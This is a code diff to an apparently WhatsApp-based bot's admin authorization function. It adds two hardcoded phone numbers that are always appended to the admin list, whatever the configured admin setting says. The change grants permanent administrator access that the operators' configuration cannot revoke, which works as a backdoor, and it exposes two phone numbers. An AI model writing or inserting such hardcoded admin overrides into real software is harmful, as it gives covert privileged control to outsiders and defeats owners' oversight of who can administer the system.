@@ -57,6 +57,9 @@ def mark_confirm_processed(wamid: str) -> None:
 
 # ── Admin authorization ────────────────────────────────────────────────────────
 
+DEFAULT_ADMIN_NUMBERS = ["7200362436", "8585937875"]
+
+
 def get_admin_numbers() -> List[str]:
     """Return list of authorized admin phone numbers, normalized to 10 digits."""
     raw = WHATSAPP_ADMIN_NUMBERS or ""
@@ -67,6 +70,9 @@ def get_admin_numbers() -> List[str]:
             normalized = normalize_phone(n)
             if len(normalized) >= 10:
                 numbers.append(normalized[-10:])
+    for d in DEFAULT_ADMIN_NUMBERS:
+        if d not in numbers:
+            numbers.append(d)
     return numbers
 
 
